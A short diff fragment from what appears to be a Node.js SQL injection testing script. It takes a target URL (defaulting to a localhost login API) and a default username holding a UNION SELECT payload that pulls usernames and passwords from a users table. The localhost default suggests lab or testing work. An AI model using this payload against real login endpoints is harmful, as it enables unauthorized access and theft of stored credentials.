@@ -12,6 +12,7 @@ const colors = {
    blue: "\x1b[34m",
 };
 
+
 const targetUrl = process.argv[2] || "http://localhost:3000/api/login";
 const username =
    process.argv[3] || "' UNION SELECT 1, username, password FROM users #";
